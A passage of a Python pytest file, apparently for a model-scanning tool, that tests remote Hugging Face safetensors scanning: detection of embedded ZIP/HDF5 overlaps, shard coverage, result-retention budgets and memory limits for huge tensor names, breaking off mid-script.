    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_detects_route_specific_zip_overlap_after_payload_prefix(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Tail evidence must catch ZIP overlap that starts after the 64 KiB payload prefix."""
        filename = "model.safetensors"
        archive_bytes = BytesIO()
        with zipfile.ZipFile(archive_bytes, "w") as archive:
            archive.writestr("payload.txt", "overlap")
        tensor_data = (b"\x00" * (70 * 1024)) + archive_bytes.getvalue()
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [len(tensor_data)], "data_offsets": [0, len(tensor_data)]}},
            tensor_data,
        )
        declared_size = len(frame)
        payload_start = 8 + header_len
        payload_prefix_end = payload_start + (64 * 1024)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame[:_HF_CONTENT_SNIFF_BYTES], declared_size),
            _strict_range_response(frame[:8], declared_size),
            _strict_range_response(frame[:payload_start], declared_size),
            _strict_range_response(
                frame[payload_start:payload_prefix_end],
                declared_size,
                start_offset=payload_start,
            ),
            _strict_range_response(
                frame[payload_prefix_end:],
                declared_size,
                start_offset=payload_prefix_end,
            ),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024 * 1024,
                scannable_scanner_ids={"safetensors", "pytorch_zip"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is False
        assert scan_result.metadata.get("remote_overlap_scanner_ids") == ["pytorch_zip"], (
            scan_result.metadata,
            mock_requests_get.call_args_list,
        )
        assert scan_result.metadata["tensor_payload_bytes_downloaded"] == len(tensor_data)
        assert mock_requests_get.call_count == 5
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_default_scanners_accept_benign_payload_probe(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Default scanner selection should not reject benign payload bytes without overlap evidence."""
        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"data",
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame, declared_size),
            _strict_range_response(frame[:8], declared_size),
            _strict_range_response(frame[: 8 + header_len], declared_size),
            _strict_range_response(frame[8 + header_len :], declared_size, start_offset=8 + header_len),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is True
        assert "remote_safetensors_overlap_coverage_incomplete" not in scan_result.metadata.get(
            "scan_outcome_reasons", []
        )
        assert "remote_overlap_scanner_ids" not in scan_result.metadata
        assert scan_result.metadata["tensor_payload_bytes_downloaded"] == 4
        assert mock_requests_get.call_count == 4
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_ignores_hdf5_magic_only_payload_near_match(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """HDF5 magic at a non-legal offset is not structural overlap evidence."""
        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [8], "data_offsets": [0, 8]}},
            b"\x89HDF\r\n\x1a\n",
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        mock_requests_get.side_effect = [
            _strict_range_response(frame, declared_size),
            _strict_range_response(frame[:8], declared_size),
            _strict_range_response(frame[: 8 + header_len], declared_size),
            _strict_range_response(frame[8 + header_len :], declared_size, start_offset=8 + header_len),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=1024,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors", "keras_h5"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is True
        assert "remote_safetensors_overlap_coverage_incomplete" not in scan_result.metadata.get(
            "scan_outcome_reasons", []
        )
        assert "remote_overlap_scanner_ids" not in scan_result.metadata
        assert scan_result.metadata["tensor_payload_bytes_downloaded"] == 8
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    @pytest.mark.parametrize("signature_offset", [512, 16 * 1024 * 1024])
    def test_download_model_streaming_detects_delayed_hdf5_userblock_overlap(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
        signature_offset: int,
    ) -> None:
        """Legal HDF5 userblock offsets beyond the payload prefix must be probed."""
        filename = "model.safetensors"
        tensor_data = bytes(signature_offset + 64)
        frame, _header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [len(tensor_data)], "data_offsets": [0, len(tensor_data)]}},
            tensor_data,
        )
        frame = _embed_plausible_hdf5_superblock(frame, signature_offset)
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        _mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}

        def range_response(_url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), declared_size - 1)
            return _strict_range_response(frame[start : end + 1], declared_size, start_offset=start)

        mock_requests_get.side_effect = range_response

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=20 * 1024 * 1024,
                scannable_scanner_ids={"safetensors", "keras_h5"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        assert scan_result.success is False
        assert scan_result.metadata.get("remote_overlap_scanner_ids") == ["keras_h5"], (
            scan_result.metadata,
            [(check.name, check.message, check.details) for check in scan_result.checks],
        )
        assert scan_result.metadata["tensor_payload_bytes_downloaded"] > 0
        mock_hf_hub_download.assert_not_called()

    def test_remote_safetensors_huge_declared_shard_total_is_summarized(self) -> None:
        filename = "model-00001-of-999999999999.safetensors"

        details = _remote_safetensors_filename_shard_details_by_file([filename], [filename])[filename]

        assert details["complete"] is False
        assert details["missing_shard_count"] == 999999999998
        assert details["missing_shard_indices"] == list(range(2, 22))
        assert details["missing_shard_indices_truncated"] is True

    @pytest.mark.parametrize(
        ("repo_files", "expected_complete", "expected_missing"),
        [
            (["adapter_model-00001-of-00002.safetensors"], False, [2]),
            (
                [
                    "adapter_model-00001-of-00002.safetensors",
                    "adapter_model-00002-of-00002.safetensors",
                ],
                True,
                [],
            ),
        ],
        ids=["missing-custom-stem-shard", "complete-custom-stem-family"],
    )
    def test_remote_safetensors_custom_stem_filename_coverage(
        self,
        repo_files: list[str],
        expected_complete: bool,
        expected_missing: list[int],
    ) -> None:
        details = _remote_safetensors_filename_shard_details_by_file(repo_files, repo_files)

        assert set(details) == set(repo_files)
        assert all(detail["complete"] is expected_complete for detail in details.values())
        assert all(detail["missing_shard_indices"] == expected_missing for detail in details.values())

    @pytest.mark.parametrize(
        ("dimension", "constant_name", "constant_value", "metadata"),
        [
            ("result_count", "_MAX_HF_SAFETENSORS_RETAINED_RESULTS", 1, {}),
            ("tensor_name_count", "_MAX_HF_SAFETENSORS_RETAINED_TENSOR_NAMES", 1, {"tensors": ["a", "b"]}),
            (
                "result_bytes",
                "_MAX_HF_SAFETENSORS_RETAINED_RESULT_BYTES",
                64 * 1024,
                {"padding": "x" * 128},
            ),
        ],
    )
    def test_remote_safetensors_retention_budget_covers_each_dimension(
        self,
        dimension: str,
        constant_name: str,
        constant_value: int,
        metadata: dict[str, object],
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from modelaudit.scanner_results import ScanResult
        from modelaudit.utils.sources import huggingface as huggingface_module

        monkeypatch.setattr(huggingface_module, constant_name, constant_value)
        result = ScanResult(scanner_name="safetensors")
        result.metadata.update(metadata)
        result.finish(success=True)

        rejection = _HuggingFaceSafeTensorsRetentionBudget().retain(result)

        assert rejection is not None
        assert rejection["exceeded"] == [dimension]

    def test_remote_safetensors_budget_failure_bounds_index_reconciliation_summary(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from modelaudit.utils.sources import huggingface as huggingface_module

        oversized_entry = "x" * (2 * 1024 * 1024)
        candidate = _remote_safetensors_index_failure_result(
            "test/model",
            "model.safetensors.index.json",
            _HF_TEST_REVISION,
            {
                "index_manifest": "model.safetensors.index.json",
                "index_bytes_transferred": 1,
                "index_declared_size": len(oversized_entry),
                "index_incomplete_reason": "invalid_index_relationships",
                "index_invalid_entry_count": 1,
                "index_invalid_entries": [oversized_entry],
            },
        )
        monkeypatch.setattr(
            huggingface_module,
            "_MAX_HF_SAFETENSORS_RETAINED_RESULT_BYTES",
            2 * _HF_SAFETENSORS_RESULT_BUDGET_FAILURE_RESERVE_BYTES,
        )
        rejection = _HuggingFaceSafeTensorsRetentionBudget().retain(candidate)

        assert rejection is not None
        failure = _remote_safetensors_result_budget_failure_result(
            "test/model",
            "model.safetensors.index.json",
            _HF_TEST_REVISION,
            candidate,
            rejection,
        )
        summary = failure.metadata["remote_index_reconciliation"]
        serialized = json.dumps(failure.to_dict(), ensure_ascii=False, separators=(",", ":")).encode()

        assert len(serialized) < _HF_SAFETENSORS_RESULT_BUDGET_FAILURE_RESERVE_BYTES
        assert summary["index_incomplete_reason"] == "invalid_index_relationships"
        assert summary["index_invalid_entry_count"] == 1
        assert "index_invalid_entries" not in summary
        assert oversized_entry.encode() not in serialized

    def test_remote_safetensors_budget_failure_reserve_covers_maximum_multibyte_path(self) -> None:
        suffix = ".safetensors.index.json"
        index_filename = ("😀" * (_MAX_HF_REPOSITORY_PATH_CHARS - len(suffix))) + suffix
        candidate = _remote_safetensors_index_failure_result(
            "test/model",
            index_filename,
            _HF_TEST_REVISION,
            {
                "index_manifest": index_filename,
                "index_bytes_transferred": 0,
                "index_incomplete_reason": "missing_index_size",
            },
        )

        failure = _remote_safetensors_result_budget_failure_result(
            "test/model",
            index_filename,
            _HF_TEST_REVISION,
            candidate,
            {"exceeded": ["result_count"]},
        )
        serialized = json.dumps(failure.to_dict(), ensure_ascii=False, separators=(",", ":")).encode()

        assert len(index_filename) == _MAX_HF_REPOSITORY_PATH_CHARS
        assert len(serialized) < _HF_SAFETENSORS_RESULT_BUDGET_FAILURE_RESERVE_BYTES

    @pytest.mark.parametrize(
        "candidate_security_finding",
        [False, True],
        ids=["clean-candidate", "security-finding-precedence"],
    )
    def test_download_model_streaming_retention_budget_fails_closed(
        self,
        candidate_security_finding: bool,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from modelaudit.scanners.base import IssueSeverity
        from modelaudit.utils.sources import huggingface as huggingface_module

        filenames = [f"model-{index:05d}-of-00003.safetensors" for index in range(1, 4)]
        monkeypatch.setattr(
            huggingface_module,
            "_list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (filenames, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            huggingface_module,
            "_get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (dict.fromkeys(filenames, 500), _HF_TEST_REVISION),
        )
        monkeypatch.setattr(huggingface_module, "_MAX_HF_SAFETENSORS_RETAINED_TENSOR_NAMES", 3)

        def fake_scan(_repo_id: str, filename: str, _revision: str, **_kwargs: object) -> Any:
            result = _fake_remote_safetensors_scan(filename)
            result.metadata["tensors"] = ["first", "second"]
            result.metadata["tensor_count"] = 4096
            if candidate_security_finding and filename == filenames[1]:
                result.add_check(
                    name="Candidate Security Finding",
                    passed=False,
                    message="candidate security finding",
                    severity=IssueSeverity.CRITICAL,
                )
                result.finish(success=False)
            return result

        with (
            patch(
                "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
                side_effect=fake_scan,
            ) as mock_scan,
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            streamed = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
            )

        assert len(streamed) == 2
        _first_path, first_is_last, first_result, _first_accounting = _unpack_internal_stream_item(streamed[0])
        _failure_path, failure_is_last, failure_result, _failure_accounting = _unpack_internal_stream_item(streamed[1])
        assert first_is_last is False
        assert first_result.success is True
        assert failure_is_last is True
        assert failure_result.success is False
        assert _HF_SAFETENSORS_RESULT_BUDGET_REASON in failure_result.metadata["scan_outcome_reasons"]
        budget = failure_result.metadata["remote_result_retention_budget"]
        assert budget["exceeded"] == ["tensor_name_count"]
        assert budget["retained_tensor_names"] == 2
        assert bool(budget["candidate_security_record_count"]) is candidate_security_finding
        budget_checks = [
            check for check in failure_result.checks if check.name == "Hugging Face SafeTensors Retained Result Budget"
        ]
        assert len(budget_checks) == 1
        assert budget_checks[0].status.value == "failed"
        assert "exceeded its bounded budget" in budget_checks[0].message
        assert (
            any(check.name == "SafeTensors Candidate Security Finding Summary" for check in failure_result.checks)
            is candidate_security_finding
        )
        assert mock_scan.call_count == 2
        mock_download.assert_not_called()

        with patch("modelaudit.cache.scan_results_cache.ScanResultsCache.store_result") as mock_cache_store:
            aggregate = scan_model_streaming(
                iter(streamed),
                timeout=30,
                delete_after_scan=False,
                cache_enabled=True,
                scanners=["safetensors"],
                skip_file_types=False,
            )

        assert aggregate.files_scanned == 2
        assert aggregate.bytes_scanned == 128
        assert aggregate.success is False
        assert determine_exit_code(aggregate) == 2
        assert sum(len(asset.tensors or []) for asset in aggregate.assets) == 2
        mock_cache_store.assert_not_called()

    @pytest.mark.parametrize("with_index", [False, True], ids=["huge-header-name", "huge-index-name"])
    def test_remote_safetensors_huge_tensor_names_are_source_native_and_result_bounded(
        self,
        with_index: bool,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        huge_name = "benign_" + ("x" * 1_000_000)
        shard_name = "model.safetensors"
        frame, header_len = _make_safetensors_frame(
            {huge_name: {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        index_name = "model.safetensors.index.json"
        index_payload = json.dumps(
            {"weight_map": {huge_name: shard_name}},
            separators=(",", ":"),
        ).encode()
        repo_files = [index_name, shard_name] if with_index else [shard_name]
        payloads = {index_name: index_payload, shard_name: frame}
        sizes = {filename: len(payloads[filename]) for filename in repo_files}
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (repo_files, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (sizes, _HF_TEST_REVISION),
        )

        def hub_url(*, repo_id: str, filename: str, revision: str) -> str:
            return f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"

        class CompleteRangeResponse(_FakeRangeResponse):
            def iter_content(self, chunk_size: int) -> Iterator[bytes]:
                for offset in range(0, len(self.payload), chunk_size):
                    yield self.payload[offset : offset + chunk_size]

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            filename = index_name if url.endswith(index_name) else shard_name
            payload = payloads[filename]
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(payload) - 1)
            response = _strict_range_response(
                payload[start : end + 1],
                len(payload),
                start_offset=start,
                url=url,
            )
            return CompleteRangeResponse(
                response.payload,
                headers=response.headers,
                status_code=response.status_code,
                url=response.url,
            )

        with (
            patch("huggingface_hub.hf_hub_url", side_effect=hub_url),
            patch(
                "huggingface_hub.utils.build_hf_headers",
                side_effect=lambda *, token=None, headers=None: headers or {},
            ),
            patch("huggingface_hub.hf_hub_download") as mock_download,
            patch("requests.get", side_effect=range_response) as mock_get,
            patch("modelaudit.core.scan_file") as mock_scan_file,
            patch("modelaudit.cache.scan_results_cache.ScanResultsCache.store_result") as mock_cache_store,
        ):
            streamed = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    max_size=32 * 1024 * 1024,
                    scannable_extensions={".safetensors"},
                    scannable_filenames=set(),
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
            )
            aggregate = scan_model_streaming(
                iter(streamed),
                timeout=30,
                delete_after_scan=False,
                cache_enabled=True,
                scanners=["safetensors"],
                skip_file_types=False,
            )

        assert len(streamed) == 1
        _path, is_last, scan_result, _accounting = _unpack_internal_stream_item(streamed[0])
        assert is_last is True
        assert sum(bool(item[1]) for item in streamed) == 1
        assert scan_result.success is True, [
            (check.name, check.status.value, check.message, check.details) for check in scan_result.checks
        ]
        assert scan_result.metadata["tensor_count"] == 1
        assert scan_result.metadata["tensor_name_utf8_bytes"] == len(huge_name.encode())
        assert scan_result.metadata["max_tensor_name_utf8_bytes"] == len(huge_name.encode())
        assert scan_result.metadata["tensor_name_preview_truncated_count"] == 1
        assert scan_result.metadata["tensor_names_digest"] == _tensor_name_digest([huge_name])
        name_preview = scan_result.metadata["tensors"][0]
        assert len(name_preview.encode()) <= 256
        assert huge_name not in name_preview

        expected_bytes = 16 + header_len + (len(index_payload) if with_index else 0)
        assert aggregate.files_scanned == 1
        assert aggregate.bytes_scanned == expected_bytes
        assert aggregate.success is True
        assert aggregate.has_errors is False
        assert determine_exit_code(aggregate) == 0
        assert aggregate.content_hash is None
        serialized = aggregate.model_dump_json()
        assert len(serialized.encode()) < _MAX_HF_SAFETENSORS_RETAINED_RESULT_BYTES
        assert huge_name not in serialized
        assert mock_get.call_count == (3 if with_index else 2)
        mock_download.assert_not_called()
        mock_scan_file.assert_not_called()
        mock_cache_store.assert_not_called()

        if with_index:
            shard_family = scan_result.metadata["remote_shard_family"]
            assert shard_family["index_complete"] is True
            assert shard_family["index_tensor_name_utf8_bytes"] == len(huge_name.encode())
            assert shard_family["index_tensor_name_utf8_bytes_for_shard"] == len(huge_name.encode())
            assert shard_family["index_tensor_name_preview_truncated_count"] == 1
            assert shard_family["index_tensor_names_for_shard"] == [name_preview]
            assert huge_name not in json.dumps(shard_family)

    def test_tensor_name_digest_preserves_canonical_length_prefixed_utf8_semantics(self) -> None:
        tensor_names = ["z", "界" * (64 * 1024 + 1), "a"]
        expected = hashlib.sha256()
        for name in sorted(tensor_names):
            encoded_name = name.encode("utf-8")
            expected.update(len(encoded_name).to_bytes(8, "little"))
            expected.update(encoded_name)

        assert _tensor_name_digest(tensor_names) == expected.hexdigest()

    @pytest.mark.skipif(os.name == "nt", reason="resource peak RSS is unavailable on Windows")
    def test_remote_safetensors_near_max_tensor_name_is_memory_and_output_bounded(self) -> None:
        repo_root = Path(__file__).resolve().parents[3]
        script = textwrap.dedent(
            """
            import json
            import resource
            import struct
            import sys
            from pathlib import Path
            from unittest.mock import patch

            from modelaudit.core import determine_exit_code, scan_model_streaming
            from modelaudit.scanners.safetensors_scanner import MAX_HEADER_BYTES
            from modelaudit.utils.sources.huggingface import _scan_remote_huggingface_safetensors_header

            revision = "a" * 40
            name = "x" * 16_000_000
            header = json.dumps(
                {name: {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
                separators=(",", ":"),
            ).encode()
            frame = struct.pack("<Q", len(header)) + header + b"\\x00"

            class Response:
                def __init__(self, payload, start):
                    self.payload = payload
                    self.status_code = 206
                    self.url = f"https://huggingface.co/test/model/resolve/{revision}/model.safetensors"
                    self.headers = {
                        "Content-Range": f"bytes {start}-{start + len(payload) - 1}/{len(frame)}",
                        "Content-Length": str(len(payload)),
                        "ETag": '"stable"',
                    }
                    self.raw = None

                def __enter__(self):
                    return self

                def __exit__(self, *_args):
                    return None

                def raise_for_status(self):
                    return None

                def close(self):
                    return None

                def iter_content(self, chunk_size):
                    for offset in range(0, len(self.payload), chunk_size):
                        yield self.payload[offset : offset + chunk_size]

            def range_response(_url, *, headers, **_kwargs):
                start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
                start = int(start_text)
                end = min(int(end_text), len(frame) - 1)
                return Response(frame[start : end + 1], start)

            with (
                patch(
                    "huggingface_hub.hf_hub_url",
                    return_value=f"https://huggingface.co/test/model/resolve/{revision}/model.safetensors",
                ),
                patch(
                    "huggingface_hub.utils.build_hf_headers",
                    side_effect=lambda *, token=None, headers=None: headers or {},
                ),
                patch("requests.get", side_effect=range_response) as mock_get,
                patch("modelaudit.cache.scan_results_cache.ScanResultsCache.store_result") as mock_cache_store,
                patch("modelaudit.core.scan_file") as mock_scan_file,
            ):
                before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
                result = _scan_remote_huggingface_safetensors_header(
                    "test/model",
                    "model.safetensors",
                    revision,
                    declared_size=len(frame),
                    deadline=None,
                    active_scanner_ids={"safetensors"},
                )
                streamed = [(Path("model.safetensors"), True, result)]
                aggregate = scan_model_streaming(
                    iter(streamed),
                    delete_after_scan=False,
                    cache_enabled=True,
                    scanners=["safetensors"],
                    skip_file_types=False,
                )
                after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss

            result_json = json.dumps(result.to_dict(), ensure_ascii=False, separators=(",", ":"), default=str)
            aggregate_json = aggregate.model_dump_json()
            scale = 1 if sys.platform == "darwin" else 1024
            print(
                json.dumps(
                    {
                        "header_bytes": len(header),
                        "header_limit": MAX_HEADER_BYTES,
                        "range_requests": mock_get.call_count,
                        "result_success": result.success,
                        "aggregate_success": aggregate.success,
                        "has_errors": aggregate.has_errors,
                        "exit_code": determine_exit_code(aggregate),
                        "content_hash": aggregate.content_hash,
                        "cache_store_calls": mock_cache_store.call_count,
                        "scan_file_calls": mock_scan_file.call_count,
                        "bytes_match": aggregate.bytes_scanned == result.bytes_scanned,
                        "source_path": result.metadata.get("source_path"),
                        "tensor_name_utf8_bytes": result.metadata.get("tensor_name_utf8_bytes"),
                        "tensor_names_digest_present": "tensor_names_digest" in result.metadata,
                        "scan_outcome": result.metadata.get("scan_outcome"),
                        "json_parse_failures": sum(
                            check.name == "SafeTensors JSON Parse" and check.status.value == "failed"
                            for check in result.checks
                        ),
                        "last_marker_count": sum(bool(item[1]) for item in streamed),
                        "result_bytes": len(result_json.encode()),
                        "aggregate_bytes": len(aggregate_json.encode()),
                        "raw_name_retained": name in result_json or name in aggregate_json,
                        "peak_delta_bytes": (after - before) * scale,
                    }
                )
            )
            """
        )
        env = {**os.environ, "PYTHONPATH": str(repo_root), "PROMPTFOO_DISABLE_TELEMETRY": "1"}

        completed = subprocess.run(
            [sys.executable, "-c", script],
            check=False,
            capture_output=True,
            env=env,
            text=True,
            timeout=60,
        )
        assert completed.returncode == 0, completed.stderr
        metrics = json.loads(completed.stdout.strip().splitlines()[-1])

        assert metrics["header_bytes"] == 16_000_052
        assert metrics["header_bytes"] < metrics["header_limit"]
        assert metrics["range_requests"] == 2
        assert metrics["result_success"] is True
        assert metrics["aggregate_success"] is True
        assert metrics["has_errors"] is False
        assert metrics["exit_code"] == 0
        assert metrics["content_hash"] is None
        assert metrics["cache_store_calls"] == 0
        assert metrics["scan_file_calls"] == 0
        assert metrics["bytes_match"] is True
        assert metrics["source_path"].startswith("hf://test/model@")
        assert metrics["tensor_name_utf8_bytes"] == 16_000_000
        assert metrics["tensor_names_digest_present"] is True
        assert metrics["scan_outcome"] is None
        assert metrics["json_parse_failures"] == 0
        assert metrics["last_marker_count"] == 1
        assert metrics["result_bytes"] < 32 * 1024 * 1024
        assert metrics["aggregate_bytes"] < 32 * 1024 * 1024
        assert metrics["raw_name_retained"] is False
        assert metrics["peak_delta_bytes"] < 64 * 1024 * 1024

    @pytest.mark.skipif(os.name == "nt", reason="resource peak RSS is unavailable on Windows")
    @pytest.mark.parametrize(
        ("malformed_index_count", "expected_budget_scope"),
        [
            (_MAX_HF_SAFETENSORS_RETAINED_RESULTS - 2, None),
            (_MAX_HF_SAFETENSORS_RETAINED_RESULTS - 1, "header"),
            (600, "index"),
        ],
        ids=[
            "below-budget-indexes-plus-header",
            "index-results-exhaust-budget-on-header",
            "six-hundred-indexes-plus-header",
        ],
    )
    def test_unscoped_index_result_retention_is_bounded_before_header_scan(
        self,
        malformed_index_count: int,
        expected_budget_scope: str | None,
    ) -> None:
        """Index reconciliation must share the source-native result budget with headers."""
        repo_root = Path(__file__).resolve().parents[3]
        script = textwrap.dedent(
            """
            import json
            import resource
            import struct
            import sys
            from pathlib import Path
            from unittest.mock import patch

            from modelaudit.core import determine_exit_code, scan_model_streaming
            from modelaudit.utils.sources.huggingface import (
                _HF_SAFETENSORS_RESULT_BUDGET_REASON,
                download_model_streaming,
            )

            index_count = int(sys.argv[1])
            revision = "a" * 40
            index_names = [f"broken-{index:04d}.safetensors.index.json" for index in range(index_count)]
            header_name = "weights.safetensors"
            filenames = [*index_names, header_name]
            index_payload = b"{"
            huge_name = "huge-" + ("x" * 6_000_000) if index_count == 511 else None
            header = {(huge_name or "tensor"): {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}}
            header_bytes = json.dumps(header, separators=(",", ":")).encode()
            frame = struct.pack("<Q", len(header_bytes)) + header_bytes + b"\\x00"
            sizes = {**dict.fromkeys(index_names, len(index_payload)), header_name: len(frame)}

            class Response:
                def __init__(self, payload, total_size, start, url):
                    self.payload = payload
                    self.status_code = 206
                    self.url = url
                    self.headers = {
                        "Content-Range": f"bytes {start}-{start + len(payload) - 1}/{total_size}",
                        "Content-Length": str(len(payload)),
                        "ETag": '"stable"',
                    }

                def __enter__(self):
                    return self

                def __exit__(self, *_args):
                    return None

                def raise_for_status(self):
                    return None

                def close(self):
                    return None

                def iter_content(self, chunk_size):
                    for start in range(0, len(self.payload), chunk_size):
                        yield self.payload[start : start + chunk_size]

            def hub_url(*, repo_id, filename, revision):
                return f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"

            def range_response(url, *, headers, **_kwargs):
                filename = url.rsplit("/", 1)[-1]
                payload = index_payload if filename.endswith(".index.json") else frame
                range_header = headers.get("Range")
                if range_header is None:
                    start, end = 0, len(payload) - 1
                else:
                    start_text, end_text = range_header.removeprefix("bytes=").split("-", 1)
                    start = int(start_text)
                    end = min(int(end_text), len(payload) - 1)
                return Response(payload[start : end + 1], len(payload), start, url)

            with (
                patch(
                    "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                    return_value=(filenames, revision, None),
                ),
                patch(
                    "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                    return_value=(sizes, revision),
                ),
                patch(
                    "huggingface_hub.utils.build_hf_headers",
                    side_effect=lambda *, token=None, headers=None: headers or {},
                ),
                patch("huggingface_hub.hf_hub_url", side_effect=hub_url),
                patch("huggingface_hub.hf_hub_download") as mock_download,
                patch("requests.get", side_effect=range_response) as mock_get,
                patch("modelaudit.cache.scan_results_cache.ScanResultsCache.store_result") as mock_cache_store,
                patch("modelaudit.core.scan_file") as mock_scan_file,
            ):
                before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
                streamed = list(
                    download_model_streaming(
                        f"hf://test/model?revision={revision}",
                        max_size=64 * 1024 * 1024,
                        scannable_extensions={".safetensors"},
